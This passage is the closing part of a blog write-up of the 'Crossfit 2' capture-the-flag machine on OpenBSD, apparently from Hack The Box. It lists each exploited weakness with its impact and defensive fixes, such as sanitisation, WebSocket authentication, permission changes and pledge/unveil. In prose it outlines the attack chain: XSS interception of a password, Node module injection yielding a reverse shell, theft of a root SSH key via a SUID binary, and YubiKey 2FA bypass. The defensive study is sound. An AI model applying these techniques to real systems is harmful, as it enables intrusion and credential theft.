<span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;sanitize-html&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>on</span>(<span style=color:#e6db74>&#39;message&#39;</span>, (<span style=color:#a6e22e>data</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>content</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>sanitizeHtml</span>(<span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>content</span>, { <span style=color:#a6e22e>allowedTags</span><span style=color:#f92672>:</span> [] });
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Process message
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>});
</span></span></code></pre></div></li><li><strong>Configuration Fix</strong>: Implement a CSP to block unauthorized script execution in the chat interface (see XSS fix above).</li></ul></li></ul></li><li><strong>Gap</strong>: Insecure WebSocket Authentication<ul><li><strong>Description</strong>: The Socket.IO implementation does not properly authenticate users joining rooms, allowing attackers to impersonate users (e.g., <code>admin</code>) via crafted <code>user_join</code> events.</li><li><strong>Impact</strong>: Attackers can eavesdrop on private communications.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>: Implement server-side authentication for WebSocket connections, verifying user identity before allowing room joins:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>on</span>(<span style=color:#e6db74>&#39;user_join&#39;</span>, (<span style=color:#a6e22e>username</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>user</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>username</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>join</span>(<span style=color:#e6db74>&#39;global&#39;</span>);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>disconnect</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>});
</span></span></code></pre></div></li><li><strong>Configuration Fix</strong>: Use secure WebSocket protocols (<code>wss://</code>) with TLS to prevent interception of WebSocket traffic:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nginx data-lang=nginx><span style=display:flex><span><span style=color:#66d9ef>location</span> <span style=color:#e6db74>/socket.io/</span> {
</span></span><span style=display:flex><span>    <span style=color:#f92672>proxy_pass</span> <span style=color:#e6db74>https://backend</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>proxy_set_header</span> <span style=color:#e6db74>Upgrade</span> $http_upgrade;
</span></span><span style=display:flex><span>    <span style=color:#f92672>proxy_set_header</span> <span style=color:#e6db74>Connection</span> <span style=color:#e6db74>&#34;upgrade&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li></ul></li></ul></li></ul><hr><h3 id=5-nodejs-application-statbotjs>5. <strong>Node.js Application (statbot.js)</strong><a href=#5-nodejs-application-statbotjs class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Gap</strong>: Insecure Node.js Module Resolution<ul><li><strong>Description</strong>: The <code>statbot.js</code> script loads the <code>ws</code> module without a local <code>node_modules</code> directory, allowing attackers to create a malicious <code>node_modules/ws/index.js</code> in a writable directory (<code>/opt/sysadmin</code>) to execute arbitrary code.</li><li><strong>Impact</strong>: Privilege escalation to the <code>john</code> user via a reverse shell.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>: Specify an absolute path to trusted modules to prevent loading from user-controlled directories:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>ws</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;/usr/local/lib/node_modules/ws&#39;</span>);
</span></span></code></pre></div></li><li><strong>Configuration Fix</strong>: Restrict write permissions on <code>/opt/sysadmin</code> to prevent unauthorized directory creation:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod <span style=color:#ae81ff>750</span> /opt/sysadmin
</span></span><span style=display:flex><span>chown root:sysadmins /opt/sysadmin
</span></span></code></pre></div></li></ul></li></ul></li><li><strong>Gap</strong>: Periodic Execution of Untrusted Script<ul><li><strong>Description</strong>: The <code>statbot.js</code> script is executed periodically (likely via cron), running as a privileged user and loading potentially malicious modules.</li><li><strong>Impact</strong>: Facilitates privilege escalation by executing attacker-controlled code.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>: Run the script with a dedicated, low-privilege user instead of a privileged one:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>useradd -r statbot
</span></span><span style=display:flex><span>chown statbot /opt/sysadmin/statbot.js
</span></span></code></pre></div>Update the cron job to run as <code>statbot</code>:<pre tabindex=0><code class=language-cron data-lang=cron>* * * * * statbot /usr/local/bin/node /opt/sysadmin/statbot.js
</code></pre></li><li><strong>Source Code Fix</strong>: Validate the integrity of loaded modules using a checksum or digital signature before execution.</li></ul></li></ul></li></ul><hr><h3 id=6-suid-binary-usrlocalbinlog>6. <strong>SUID Binary (/usr/local/bin/log)</strong><a href=#6-suid-binary-usrlocalbinlog class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Gap</strong>: Overly Permissive SUID Binary<ul><li><strong>Description</strong>: The <code>log</code> binary is setuid and owned by the <code>staff</code> group, allowing the <code>john</code> user to execute it and read files in <code>/var</code>, including SSH key backups (<code>/var/backups/root.ssh_id_rsa.current</code>).</li><li><strong>Impact</strong>: Exposure of the root SSH private key, enabling further authentication attempts.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>: Remove the setuid bit or restrict group ownership to prevent unauthorized access:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod u-s /usr/local/bin/log
</span></span><span style=display:flex><span>chown root:root /usr/local/bin/log
</span></span></code></pre></div></li><li><strong>Source Code Fix</strong>: Restrict the <code>unveil</code> syscall to specific files rather than the entire <code>/var</code> directory:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>unveil</span>(<span style=color:#e6db74>&#34;/var/log/specific_log_file&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>);
</span></span></code></pre></div></li></ul></li></ul></li><li><strong>Gap</strong>: Readable Backup Files<ul><li><strong>Description</strong>: SSH private key backups in <code>/var/backups</code> (e.g., <code>root.ssh_id_rsa.current</code>) are readable by the SUID binary, exposing sensitive credentials.</li><li><strong>Impact</strong>: Allows attackers to steal the root SSH key.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>: Restrict permissions on backup files to <code>root</code> only:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> /var/backups/*
</span></span><span style=display:flex><span>chown root:root /var/backups/*
</span></span></code></pre></div></li><li><strong>Configuration Fix</strong>: Disable SSH key backups or encrypt them to prevent unauthorized access:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sysrc backup_enable<span style=color:#f92672>=</span>NO
</span></span></code></pre></div></li></ul></li></ul></li></ul><hr><h3 id=7-ssh-service-port-22>7. <strong>SSH Service (Port 22)</strong><a href=#7-ssh-service-port-22 class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Gap</strong>: Weak YubiKey Authentication Configuration<ul><li><strong>Description</strong>: The SSH server requires two-factor authentication (<code>publickey,password</code>) but stores YubiKey secrets (<code>/var/db/yubikey/root.uid</code>, <code>root.key</code>, <code>root.ctr</code>) in a readable directory, allowing attackers to extract and simulate YubiKey tokens.</li><li><strong>Impact</strong>: Bypassing two-factor authentication to gain root access.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>: Restrict access to YubiKey secrets:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> /var/db/yubikey/*
</span></span><span style=display:flex><span>chown root:root /var/db/yubikey/*
</span></span></code></pre></div></li><li><strong>Configuration Fix</strong>: Use a dedicated YubiKey authentication server (e.g., YubiCloud) instead of local secrets to prevent file-based extraction.</li></ul></li></ul></li><li><strong>Gap</strong>: Password Reuse in Private Messages<ul><li><strong>Description</strong>: The SSH password for the <code>david</code> user was sent in a private message over the chat application, exposing it to XSS-based interception.</li><li><strong>Impact</strong>: Allowed attackers to log in as <code>david</code> via SSH.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>: Prevent sensitive data (e.g., passwords) from being sent in chat messages by implementing content filtering in the chat application:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>on</span>(<span style=color:#e6db74>&#39;message&#39;</span>, (<span style=color:#a6e22e>data</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#e6db74>/password|secret/i</span>.<span style=color:#a6e22e>test</span>(<span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>content</span>)) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#39;Sensitive data detected&#39;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>});
</span></span></code></pre></div></li><li><strong>Configuration Fix</strong>: Educate users not to share credentials via chat and enforce strong, unique passwords via <code>login.conf</code>:<pre tabindex=0><code class=language-conf data-lang=conf>:minpasswordlen=12:
</code></pre></li></ul></li></ul></li></ul><hr><h3 id=8-general-system-configuration>8. <strong>General System Configuration</strong><a href=#8-general-system-configuration class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Gap</strong>: Overly Permissive Directory Permissions<ul><li><strong>Description</strong>: The <code>/opt/sysadmin</code> directory is writable by the <code>sysadmins</code> group, allowing the <code>david</code> user to create a malicious <code>node_modules</code> directory.</li><li><strong>Impact</strong>: Facilitates privilege escalation via Node.js module injection.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>: Restrict directory permissions to <code>root</code> or a dedicated service account:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod <span style=color:#ae81ff>750</span> /opt/sysadmin
</span></span><span style=display:flex><span>chown root:sysadmins /opt/sysadmin
</span></span></code></pre></div></li></ul></li></ul></li><li><strong>Gap</strong>: Lack of Process Isolation<ul><li><strong>Description</strong>: The <code>statbot.js</code> script and <code>log</code> binary run with excessive privileges, allowing escalation to <code>john</code> and access to sensitive files.</li><li><strong>Impact</strong>: Enables privilege escalation and sensitive file access.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>: Use OpenBSD&rsquo;s <code>pledge</code> and <code>unveil</code> syscalls to restrict the <code>statbot.js</code> and <code>log</code> processes to minimal permissions:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>pledge</span>(<span style=color:#e6db74>&#34;stdio rpath&#34;</span>, NULL);
</span></span><span style=display:flex><span><span style=color:#a6e22e>unveil</span>(<span style=color:#e6db74>&#34;/opt/sysadmin/statbot.js&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>);
</span></span></code></pre></div></li><li><strong>Configuration Fix</strong>: Run services with least-privilege users and implement Mandatory Access Control (MAC) policies to enforce isolation.</li></ul></li></ul></li></ul><hr><h2 id=summary-of-fixes>Summary of Fixes<a href=#summary-of-fixes class=hanchor arialabel=Anchor>#</a></h2><ul><li><strong>Web Server</strong>: Parameterized queries, WAF, restricted file privileges, suppressed error messages.</li><li><strong>Web Application</strong>: Input sanitization, strict CORS, robust CSRF validation, CSP.</li><li><strong>DNS Server</strong>: Restricted control port access, secured configuration files.</li><li><strong>Chat Application</strong>: Message sanitization, WebSocket authentication, TLS.</li><li><strong>Node.js Application</strong>: Absolute module paths, restricted directory permissions, low-privilege execution.</li><li><strong>SUID Binary</strong>: Removed setuid bit, restricted file access, specific <code>unveil</code> paths.</li><li><strong>SSH Service</strong>: Secured YubiKey secrets, content filtering, strong password policies.</li><li><strong>System</strong>: Tightened directory permissions, process isolation with <code>pledge</code>/<code>unveil</code>, MAC policies.</li></ul><p>Implementing these fixes would significantly harden the system against the exploited vulnerabilities, ensuring secure code practices and robust configuration management.</p><h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>#</a></h2><p>Crossfit 2 is an excellent machine that demonstrates the complexity of modern multi-service application security on OpenBSD. It requires expertise in:</p><ul><li>Advanced web application security and WebSocket exploitation</li><li>DNS manipulation and rebinding attacks</li><li>Cross-site scripting and CORS bypass techniques</li><li>Node.js security and module resolution abuse</li><li>OpenBSD-specific privilege escalation and system hardening</li><li>Two-factor authentication bypass and YubiKey simulation</li></ul><p>The machine emphasizes the importance of proper input validation, secure configuration of all system components, and the risks of privilege escalation through seemingly minor misconfigurations.</p><hr><p><em>This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.</em></p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>Â© 2025 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>